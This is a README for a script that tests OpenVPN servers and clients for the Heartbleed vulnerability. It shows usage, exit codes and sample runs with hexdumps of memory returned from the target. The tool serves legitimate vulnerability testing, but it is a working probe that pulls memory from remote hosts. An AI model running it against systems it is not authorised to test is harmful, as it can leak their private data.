Heartbleed OpenVPN test with support for HMAC Firewall and server mode
======================================================================

## Description

This script can be used to test OpenVPN servers *and* clients for the
Heartbleed vulnerability (CVE-2014-0160). It supports the OpenVPN "HMAC
Firewall" (`--tls-auth`).

## Usage

```
./heartbleed_test_openvpn.py [--remote host [port]] [--tls-auth file [direction]]
```

The exit status is `11` if the vulnerability has been detected, `0` if not, and
other values if an error occurred (e.g. connection timeout).

## Examples

### Test VPN server

Specify the VPN server (and optionally port) with `--remote` and use
`--tls-auth` if the server is protected by an HMAC firewall.

```
$ ./heartbleed_test_openvpn.py --remote vpn1.example.com
VULNERABLE

Hexdump of returned payload (64 of 4096 bytes):
00000000  48 65 61 72 74 62 6c 65  65 64 20 65 78 61 6d 70  |Heartbleed examp|
00000010  6c 65 20 70 61 79 6c 6f  61 64 00 00 00 00 00 00  |le payload......|
00000020  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000030  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000040
```

```
$ ./heartbleed_test_openvpn.py --remote vpn2.example.com --tls-auth tls.key 1
NOT VULNERABLE (ONLY ACK RECEIVED)
```

### Test VPN client

Run the script (optionally specify port with `--port`), and make the OpenVPN
client connect to the host/port where the script is running.

```
$ ./heartbleed_test_openvpn.py 
VULNERABLE

Hexdump of returned payload (64 of 4096 bytes):
00000000  48 65 61 72 74 62 6c 65  65 64 20 65 78 61 6d 70  |Heartbleed examp|
00000010  6c 65 20 70 61 79 6c 6f  61 64 39 32 2e 31 36 38  |le payload92.168|
00000020  2e 35 2e 31 35 32 3a 31  31 39 34 00 00 00 00 00  |.5.152:1194.....|
00000030  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000040
```
